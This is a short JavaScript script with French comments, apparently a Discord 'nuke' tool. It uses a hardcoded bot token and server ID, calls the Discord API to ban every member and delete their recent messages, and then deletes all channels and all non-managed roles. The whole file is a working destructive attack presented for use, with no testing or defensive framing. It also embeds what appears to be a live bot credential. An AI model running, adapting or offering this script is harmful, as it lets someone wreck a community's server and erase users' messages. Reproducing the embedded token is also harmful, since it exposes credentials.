const token = "MTU2NTE4OTU2MTg5MjQ3NTAwMA.GIR000.44BI8fHRS8iFPHy-pxTvoPQav29y5N6fAXXcW0";
const guild = "1561721386026799165";

async function fullNuke() {
  console.log("démarrage du grand nettoyage...");

  // 1. ban de tout le monde
  console.log("--- BAN DES MEMBRES ---");
  let after = "0";
  let banCount = 0;
  while (true) {
    let res = await fetch(`https://discord.com/api/v9/guilds/${guild}/members?limit=1000&after=${after}`, {
      headers: { "Authorization": `Bot ${token}` }
    });
    let batch = await res.json();
    if (batch.message) { console.log("erreur ban :", batch.message); break; }
    if (!batch.length) { break; }
    
    for (let m of batch) {
      await fetch(`https://discord.com/api/v9/guilds/${guild}/bans/${m.user.id}`, {
        method: "PUT",
        headers: { "Authorization": `Bot ${token}`, "Content-Type": "application/json" },
        body: JSON.stringify({ delete_message_seconds: 604800 })
      }).catch(() => {});
      banCount++;
      console.log(`membre banni : ${banCount}`);
      await new Promise(r => setTimeout(r, 1000));
    }
    after = batch[batch.length - 1].user.id;
  }

  // 2. suppression des salons
  console.log("--- SUPPRESSION DES SALONS ---");
  let channels = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/channels`, {
    headers: { "Authorization": `Bot ${token}` }
  })).json();
  
  for (let c of channels) {
    await fetch(`https://discord.com/api/v9/channels/${c.id}`, {
      method: "DELETE",
      headers: { "Authorization": `Bot ${token}` }
    }).catch(() => {});
    console.log(`salon supprimé : ${c.name}`);
    await new Promise(r => setTimeout(r, 500));
  }

  // 3. suppression des rôles
  console.log("--- SUPPRESSION DES RÔLES ---");
  let roles = await (await fetch(`https://discord.com/api/v9/guilds/${guild}/roles`, {
    headers: { "Authorization": `Bot ${token}` }
  })).json();
  
  for (let r of roles) {
    if (r.name === "@everyone" || r.managed) continue;
    await fetch(`https://discord.com/api/v9/guilds/${guild}/roles/${r.id}`, {
      method: "DELETE",
      headers: { "Authorization": `Bot ${token}` }
    }).catch(() => {});
    console.log(`rôle supprimé : ${r.name}`);
    await new Promise(r => setTimeout(r, 500));
  }

  console.log("fin du grand nettoyage.");
}

fullNuke();
